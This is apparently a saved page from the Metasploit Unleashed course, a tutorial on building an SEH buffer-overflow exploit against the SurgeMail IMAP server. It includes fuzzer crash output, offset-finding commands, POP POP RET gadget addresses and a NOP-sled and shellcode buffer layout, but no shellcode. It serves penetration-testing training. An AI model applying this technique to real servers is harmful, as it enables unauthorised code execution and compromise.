<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Making Something Go Boom</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Making
Something Go Boom</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);"><br>
Previously we looked at fuzzing an IMAP server in the Simple IMAP
Fuzzer section. At the end of that effort we found that we could
overwrite EIP, making ESP the only register pointing to a memory
location under our control (4 bytes after our return address). We can
go ahead and rebuild our buffer (fuzzed = "A"*1004 + "B"*4 + "C"*4) to
confirm that the execution flow is redirectable through a JMP ESP
address as a ret.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">msf auxiliary(fuzz_imap) &gt; run<br><br>[*] Connecting to IMAP server 172.16.30.7:143...<br>[*] Connected to target IMAP server.<br>[*] Authenticating as test with password test...<br>[*] Generating fuzzed data...<br>[*] Sending fuzzed data, buffer length = 1012<br>[*] 0002 LIST () /"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]BBBBCCCC" "PWNED"<br>[*] Connecting to IMAP server 172.16.30.7:143...<br>[*] Connected to target IMAP server.<br>[*] Authenticating as test with password test...<br>[*] Authentication failed<br>[*] It seems that host is not responding anymore and this is G00D ;)<br>[*] Auxiliary module execution completed<br>msf auxiliary(fuzz_imap) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:EXPLOIT01.png"
 class="image"><img alt="EXPLOIT01.png"
 src="http://www.offensive-security.com/w/images/2/24/EXPLOIT01.png"
 width="687" height="512"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
</p>
<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
 id="Controlling_Execution_Flow">Controlling Execution Flow</span></h4>
<p style="color: rgb(0, 0, 0);">We now need to determine the correct
offset in order get code
execution. Fortunately, Metasploit comes to the rescue with two very
useful utilities: pattern_create.rb and pattern_offset.rb. Both of
these scripts are located in Metasploit's 'tools' directory. By running
pattern_create.rb , the script will generate a string composed of
unique patterns that we can use to replace our sequence of 'A's.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:~# /pentest/exploits/framework3/tools/pattern_create.rb 11000<br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A<br>c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2<br>Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">After we have successfully
overwritten EIP or SEH (or whatever
register you are aiming for), we must take note of the value contained
in the register and feed this value to pattern_offset.rb to determine
at which point in the random string the value appears.
</span>
<p style="color: rgb(0, 0, 0);">Rather than calling the command line
pattern_create.rb, we will
call the underlying API directly from our fuzzer using the
Rex::Text.pattern_create(). If we look at the source, we can see how
this function is called.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);"> def self.pattern_create(length, sets = [ UpperAlpha, LowerAlpha, Numerals ])<br>        buf = ''<br>        idx = 0<br>        offsets = []<br>        sets.length.times { offsets &lt;&lt; 0 }<br>        until buf.length &gt;= length<br>                begin<br>                        buf &lt;&lt; converge_sets(sets, 0, offsets, length)<br>                rescue RuntimeError<br>                        break<br>                end<br>        end<br>        # Maximum permutations reached, but we need more data<br>        if (buf.length &lt; length)<br>                buf = buf * (length / buf.length.to_f).ceil<br>        end<br>        buf[0,length]<br>end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">So we see that we call the
pattern_create function which will take
at most two parameters, the size of the buffer we are looking to create
and an optional second paramater giving us some control of the contents
of the buffer. So for our needs, we will call the function and replace
our fuzzed variable with fuzzed = Rex::Text.pattern_create(11000).
</span>
<p style="color: rgb(0, 0, 0);">This causes our SEH to be overwritten
by 0x684E3368 and based on
the value returned by pattern_offset.rb, we can determine that the
bytes that overwrite our exception handler are the next four bytes
10361, 10362, 10363, 10364.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:~# /pentest/exploits/framework3/tools/pattern_offset.rb 684E3368 11000 10360</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:EXPLOIT03.png"
 class="image"><img alt="EXPLOIT03.png"
 src="http://www.offensive-security.com/w/images/8/8f/EXPLOIT03.png"
 width="692" height="525"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
As it often happens in SEH overflow attacks, we now need to find a
POP POP RET (other sequences are good as well as explained in
"Defeating the Stack Based Buffer Overflow Prevention Mechanism of
Microsoft Windows 2003 Server" Litchfield 2003) address in order to
redirect the execution flow to our buffer. However, searching for a
suitable return address in surgemail.exe, obviously leads us to the
previously encountered problem, all the addresses have a null byte.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:~# /pentest/exploits/framework3/msfpescan -p surgemail.exe<br><br>[surgemail.exe]<br>0x0042e947 pop esi; pop ebp; ret<br>0x0042f88b pop esi; pop ebp; ret<br>0x00458e68 pop esi; pop ebp; ret<br>0x00458edb pop esi; pop ebp; ret<br>0x00537506 pop esi; pop ebp; ret<br>0x005ec087 pop ebx; pop ebp; ret<br><br>0x00780b25 pop ebp; pop ebx; ret<br>0x00780c1e pop ebp; pop ebx; ret<br>0x00784fb8 pop ebx; pop ebp; ret<br>0x0078506e pop ebx; pop ebp; ret<br>0x00785105 pop ecx; pop ebx; ret<br>0x0078517e pop esi; pop ebx; ret</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Fortunately this time we have a
further attack approach to try in
the form of a partial overwrite, overflowing SEH with only the 3 lowest
significant bytes of the return address. The difference is that this
time we can put our shellcode into the first part of the buffer
following a schema like the following:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">| NOPSLED | SHELLCODE | NEARJMP | SHORTJMP | RET (3 Bytes) |</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">POP POP RET will redirect us 4 bytes
before RET where we will place
a short JMP taking us 5 bytes back. We'll then have a near back JMP
that will take us in the middle of the NOPSLED.
</span>
<p style="color: rgb(0, 0, 0);">This was not possible to do with a
partial overwrite of EIP and
ESP, as due to the stack arrangement ESP was four bytes after our RET.
If we did a partial overwrite of EIP, ESP would then be in an
uncontrollable area.
<br>
<br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Development"
 title="Exploit Development">Exploit Development</a></div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Getting_A_Shell"
 title="Getting A Shell">Getting a Shell</a></div>
</body>
</html>
